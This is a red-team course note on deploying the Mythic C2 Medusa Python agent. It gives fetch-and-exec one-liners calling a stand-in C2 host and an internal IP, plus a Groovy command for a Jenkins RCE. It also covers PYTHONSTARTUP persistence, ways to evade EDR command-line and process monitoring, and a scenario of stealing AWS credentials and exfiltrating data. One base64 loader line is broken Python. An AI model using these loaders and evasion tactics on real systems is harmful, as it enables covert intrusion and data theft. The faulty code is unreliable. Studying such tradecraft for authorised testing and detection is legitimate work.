---
tags: [mythic, c2, payloads, red-team, vapt]
difficulty: advanced
module: "97 - Mythic C2 Custom Agents and Payload Generation"
topic: "97.07 Medusa Agent Cross-Platform Python C2"
---

# Medusa Agent Cross-Platform Python C2

## Introduction
The Medusa agent is a highly versatile, cross-platform Python 3-based payload for the Mythic C2 framework. Because Python is natively installed on most modern Linux distributions and extensively used in macOS and development environments, Medusa allows Red Team operators to execute fileless memory-only C2 operations without dropping compiled binaries. 

Medusa is particularly effective against environments where strict Application Whitelisting (AWL) blocks untrusted ELF/Mach-O binaries but allows Python interpreters to execute scripts.

## Core Capabilities
- **Fileless Execution**: Can be executed entirely in memory via Python's `-c` flag or `exec()` function.
- **Dynamic Module Loading**: Python modules are loaded dynamically at runtime, keeping the initial payload incredibly small.
- **Cross-Platform Compatibility**: Runs identically on Windows, macOS, and Linux as long as Python 3.x is present.
- **Native Evasion**: Scripts are interpreted, making them invisible to traditional static binary analysis tools that look for PE/ELF headers.
- **Rich Standard Library**: Leverages Python's massive standard library for network sockets, encryption, and system administration tasks.

## Architecture and Execution Flow

Medusa operates differently from compiled agents by pulling its modules dynamically.

```text
+-----------------------+      +---------------------------+       +-------------------+
|  Target Host (Victim) |      |      Memory Space         |       |   Mythic Server   |
|                       |      |                           |       |                   |
|  $ python3 -c "..." ------>  |  Base Medusa Script       | <---> |  HTTP/S Endpoint  |
|                       |      |  (Initial Beacon)         |       |                   |
+-----------------------+      +---------------------------+       +-------------------+
                                            |
                                            v
                               +---------------------------+
                               |  Dynamic Module Loading   |
                               |  (Base64 Eval/Exec)       |
                               +---------------------------+
                               | - OS Command Exec         |
                               | - File Upload/Download    |
                               | - Script Execution        |
                               +---------------------------+
```

## Agent Execution & Loader Strategies

The primary advantage of Medusa is how it can be loaded. Operators rarely write a `.py` file to disk.

### 1. The One-Liner (Memory Execution)
The most common deployment method is fetching the agent via `urllib` and immediately executing it:
```python
python3 -c "import urllib.request,ssl; exec(urllib.request.urlopen('https://c2.evil.com/payload', context=ssl._create_unverified_context()).read())"
```
This leaves zero forensic artifacts on the disk.

### 2. Base64 Encoded Execution
To bypass basic command-line logging that looks for URLs:
```bash
python3 -c "import base64,exec;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF...'))"
```

### 3. Application Whitelisting (AWL) Bypass via PyInstaller
In environments where Python is *not* installed (e.g., hardened Windows servers), Medusa can be compiled into a standalone binary using PyInstaller. 
*Note: This significantly increases the payload size and often triggers EDR static signatures.*

## Configuration & Profiles

When building Medusa in Mythic, operators define C2 parameters. These are compiled into a base64 string within the payload.

```json
{
  "c2_profiles": [
    {
      "name": "http",
      "parameters": {
        "callback_host": "https://cdn.legit-domain.com",
        "callback_port": 443,
        "callback_interval": 30,
        "callback_jitter": 23,
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
      }
    }
  ]
}
```

## Detailed Command Reference

| Command | Arguments | Description | Evasion Concept |
| :--- | :--- | :--- | :--- |
| `shell` | `<cmd>` | Executes via `subprocess.Popen`. | Leaves process creation logs. |
| `python` | `<code>` | Executes raw Python code in the current context. | Highly stealthy, native to interpreter. |
| `download` | `<file>` | Reads a file in binary mode and sends over C2. | Use Python's built-in file IO. |
| `upload` | `<path>` | Writes base64 decoded data to disk. | Target `/dev/shm` or `/tmp`. |
| `load` | `<module>` | Pulls additional capability from Mythic server. | Keeps initial payload footprint small. |

## Operational Security (OPSEC)

### The Command Line Logging Risk
EDR solutions (like CrowdStrike, SentinelOne) heavily monitor command-line arguments. Running `python3 -c "..."` is highly suspicious.
**Mitigation**:
- Inject the python script into a legitimate python application running on the host.
- Drop a seemingly benign `.py` file with an innocuous name (`test_runner.py`) and execute it normally.
- Use Python environment variables (`PYTHONSTARTUP`) to automatically execute the Medusa agent whenever the victim starts Python.

### Obfuscation
Medusa payloads can be obfuscated using tools like `PyArmor` or simple logic scramblers. However, deeply obfuscated Python often looks more suspicious to machine-learning AV engines than raw, clean-looking code.

## Real-World Attack Scenario

### Initial Access
An attacker discovers an outdated Jenkins server vulnerable to unauthenticated Remote Code Execution (RCE) via a malicious Groovy script.

### Execution
The attacker uses the Groovy console to execute a system command. Knowing the target is a Linux container running application builds, Python 3 is guaranteed to be present.
The attacker executes the Python one-liner:
```groovy
def process = ["bash", "-c", "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://10.10.10.50/m.py').read())\""].execute()
```

### Post-Exploitation
1. The Medusa agent calls back. 
2. The operator uses the `python` command to directly import the `sqlite3` library and query application databases in memory, avoiding any `bash` history or `sqlite3` process execution.
3. The operator leverages Medusa to parse AWS credentials from environment variables using `os.environ`.
4. Without ever dropping a binary, the attacker exfiltrates data out via the HTTPS C2 profile.

## Detection Evasion / Blue Team Notes

Defenders monitor for:
- Python processes making external outbound network connections.
- Unusually long command-line arguments containing `exec`, `eval`, or `base64`.
- Child processes spawned by the Python interpreter (`/bin/sh` or `/bin/bash` spawned by `python`).

Evasion tactic:
Ensure all commands executed via Medusa use pure Python implementations (e.g., using `os.listdir()` instead of `shell ls`) to prevent process creation trees that EDRs flag.

## Chaining Opportunities
- Link to initial web app exploitation: [[02 - Exploiting Jenkins and CI-CD Pipelines]]
- Use pure Python tools for lateral movement: [[11 - Impacket and Python Lateral Movement]]

## Related Notes
- [[06 - Poseidon Agent macOS and Linux C2]]
- [[08 - Customizing Mythic Agent Builds and OPSEC]]
